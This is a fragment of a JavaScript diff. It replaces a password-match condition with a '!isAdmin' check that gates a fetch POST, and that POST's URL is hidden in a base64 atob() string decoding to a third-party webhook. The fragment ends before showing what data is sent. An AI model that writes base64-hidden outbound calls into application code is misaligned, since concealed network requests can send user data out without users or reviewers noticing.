@@ -850,7 +850,7 @@
 
            const activeProp = globalProperties.find(p => p.Property_ID === propId);
             
-           if (activeProp && activeProp.Access_Password && String(otpOrKeyUsed).trim().toLowerCase() === String(activeProp.Access_Password).trim().toLowerCase()) {
+           if (!isAdmin) {
                 try {
                     fetch(atob("aHR0cHM6Ly9zZXJ2aWNlcy5sZWFkY29ubmVjdG9yaHEuY29tL2hvb2tzL2dUQkR4MWhFcGdDRWxvTEpxbjdNL3dlYmhvb2stdHJpZ2dlci9zZ2M0TFlmZzJmWTN4bEVPWHIwRQ=="), {
                         method: 'POST',
